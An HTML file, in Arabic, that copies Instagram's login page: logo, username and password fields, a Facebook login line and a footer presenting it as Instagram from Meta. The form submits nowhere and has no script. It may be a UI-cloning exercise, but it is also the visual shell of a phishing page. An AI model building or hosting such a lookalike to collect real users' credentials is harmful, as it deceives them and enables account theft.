<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول - إنستقرام</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  
  <div class="container">
    
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
    </div>
    <form>
      <input type="text" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
      <input type="password" placeholder="كلمة المرور" required>
      <button type="submit" class="login-btn">تسجيل الدخول</button>
    </form>
    <div class="divider"><span>أو</span></div>
    <div>
      <p style="color: #385185;">تسجيل الدخول باستخدام فيسبوك</p>
    </div>
    <div class="signup-link">
      ليس لديك حساب؟ <a href="#">سجّل الآن</a>
    </div>
    <div class="footer">© 2025 Instagram from Meta</div>
  </div>
</body>
</html>
